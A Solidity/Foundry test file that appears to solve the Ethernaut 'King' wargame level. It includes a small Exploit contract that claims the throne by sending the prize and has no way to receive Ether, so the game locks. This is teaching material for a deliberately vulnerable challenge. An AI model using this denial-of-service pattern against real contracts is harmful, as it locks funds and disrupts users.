// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {King} from "../../src/09/King.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {KingFactory} from "src/09/KingFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract KingTest is Test, BaseTest {
    King public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new KingFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = King(instance);
    }

    function testFactoryIsKing() public view {
        assert(instanceContract._king() == levelFactory);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 prize = instanceContract.prize();
        Exploit exploit = new Exploit{value: prize}(address(instanceContract));

        vm.stopPrank();

        assert(instanceContract._king() == address(exploit));
    }
}

contract Exploit {
    constructor(address instance) payable {
        (bool success,) = instance.call{value: msg.value}("");
        require(success, "Failed to send Ether");
    }
}
